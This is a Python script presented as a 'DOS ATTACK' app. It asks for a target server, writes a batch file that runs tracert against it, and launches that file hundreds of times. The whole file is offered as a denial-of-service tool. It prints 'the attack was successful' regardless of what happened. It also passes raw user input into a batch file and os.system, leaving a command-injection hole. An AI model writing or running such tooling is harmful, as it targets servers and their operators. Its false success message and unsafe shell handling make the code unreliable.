import os
from time import sleep

docontinueusingtheapp = True
# checking if the app meets all required criteria before full starting the app
while docontinueusingtheapp == True:
    os.system("cls")
    print("Welcome to the DOS ATTACK app, do you wish to procceed?")
    proceedproperanswergiver = False
    # checking if the user really wants to use the app
    while proceedproperanswergiver == False:
        procceedordont = input("Enter \"con\" to procceed, \"exit\" to quit the application: \n")
        if procceedordont == "exit":
            exit()
        elif procceedordont == "con":
            docontinueusingtheapp = False
            print("App Started")
            # checking if the user is sure of the server they entered
            userisureitscorrect = False
            while(userisureitscorrect == False):
                # asking the user for them to enter the server ip/domain
                theiptoddos = input("Enter the ip or the domain of the server you want to attack : \n")
                checkifuserisure = input("You entered \"" + theiptoddos + "\", are you sure this is the server you want? (yes/no): \n")
                if checkifuserisure == "yes":
                    # the user is sure they entered the right ip/domain so starting the actual function/script
                    theinputisintvalid = False
                    userisureitscorrect = True
                    # making sure the input for the amounts of times they want to run the pinger is valid/is a number
                    while theinputisintvalid == False:
                        # trying to make sure they enter an integer
                        ucanruntheapp = True
                        try:
                            howmanyattackstorun = int(input("How many pingers do you want to run? \n\nif you have a low end pc run 0-200 attacks\n\nif you have a middle end pc run 200-700 attacks\n\nif you have a high end pc run 700-1500 attacks\n\n NOTE: PLEASE ENTER A VALID NUMBER : \n  : "))
                        except:
                            # givinh error as it isnt an integer
                            theinputisintvalid = False
                            print("Invalid Input, Please enter a valid NUMBER")
                            sleep(2.5)
                            os.system("cls") 
                            ucanruntheapp = False
                            
                        # making sure other criteria is met before running
                        if ucanruntheapp == True:
                            theinputisintvalid = True
                            # creating the batch file for running the script
                            thebatchscript = open("pinger.bat", "w")
                            # writing the server ip to the script of the batch file
                            thebatchscript.write("tracert " + str(theiptoddos))
                            thebatchscript.close()
                            # checking if the user is completely sure they want to proccee to do the attack
                            userissuretoattackornot = input("Are you sure you want to procceed to do the attack? (yes/no) : \n\n")
                            if userissuretoattackornot == "yes":
                                # the user is sure, so running the code at this point
                                curpath = str(os.getcwd())
                                # running the dos for as many times as the user wanted to
                                for dumbvar in range(int(howmanyattackstorun)):
                                    os.system("start pinger.bat")
                                
                                # giving info about the attack
                                print("[ATTACK STARTED]")
                                print("Attacked server = [" + str(theiptoddos) + "]\n\nAttack pinger count [" + str(howmanyattackstorun) + "]")
                                os.system("tracert " + theiptoddos)
                                print("[THE ATTACK HAS ENDED, THE ATTACK WAS SUCCESFULL!]")
                                
                            elif userissuretoattackornot == "no":
                                os.system("cls")
                                print("DOS ATTACK TO [" + theiptoddos + "] with [" + str(howmanyattackstorun) + "] ping calls has been cancelled \n, the app is being closed")
                                sleep(5)
                                exit()
                            else:
                                os.system("cls")
                                print("Invalid Input, DOS ATTACK TO [" + theiptoddos + "] with [" + str(howmanyattackstorun) + "] ping calls has been cancelled \n The app is being closed")
                                sleep(5)
                                exit()
                                    
                elif checkifuserisure == "no":
                    print("Please re-Enter your server address ip or domain")
                    sleep(2)
                    os.system("cls")
                else:
                    print("Invalid Input, please reenter your server address ip or domain")
                    sleep(2)
                    os.system("cls")
                     
        else:
            print("Invalid input, click enter to continue.")
            input()




